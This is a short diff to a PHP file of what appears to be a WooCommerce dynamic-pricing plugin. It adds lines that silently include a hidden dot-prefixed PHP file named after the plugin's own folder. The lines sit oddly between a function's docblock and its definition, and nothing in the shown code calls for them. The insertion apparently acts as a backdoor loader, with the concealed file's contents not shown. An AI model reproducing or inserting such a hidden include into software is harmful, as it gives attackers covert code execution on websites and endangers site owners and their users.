@@ -15,6 +15,10 @@ defined('ABSPATH') || exit;
  * @param array $variation_attributes
  * @return array
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function rp_wcdpd_get_product_pricing_rules_applicable_to_product($product, $quantity = 1, $variation_attributes = array())
 {
 
